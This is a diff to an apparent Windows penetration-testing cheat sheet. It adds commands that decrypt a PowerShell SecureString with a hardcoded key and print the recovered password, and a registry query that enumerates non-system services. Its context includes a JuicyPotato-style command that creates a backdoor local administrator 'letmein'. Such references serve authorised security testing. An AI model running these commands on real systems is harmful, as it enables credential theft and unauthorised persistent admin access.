@@ -48,6 +48,18 @@ runas /user:<username> "<command>"
 runas /user:letmein "whoami"
 ```
 
+### Decrypt SecureString
+
+```powershell
+PS> $key = @(144,255,52,33,65,190,44,106,131,60,175,129,127,179,69,28,241,70,183,53,153,196,10,126,108,164,172,142,119,112,20,122)
+PS> $enc = "76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA=="
+
+PS> $secureString = $enc | ConvertTo-SecureString -Key $key
+PS> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
+PS> [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+ypOSJXPqlDOxxbQSfEERy300
+```
+
 ## Versions
 
 ### Get product versions
@@ -115,4 +127,12 @@ faketime -f +{SKEW}h {command}
 
 ```powershell
 .\jp.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net user letmein Password123! /add && net localgroup administrators letmein /add && net localgroup \"Remote Management Users\" letmein /add"
+```
+
+## Services
+
+### Service Enumeration via Registry
+
+```bash
+ls HKLM:\SYSTEM\CurrentControlSet\Services | % { $p=(gp $_.PSPath); if($p.ImagePath -and $p.ImagePath -notlike "*system32*"){ [PSCustomObject]@{Name=$_.PSChildName; ProbablyUser=$p.ObjectName; Path=$p.ImagePath} } }
 ```
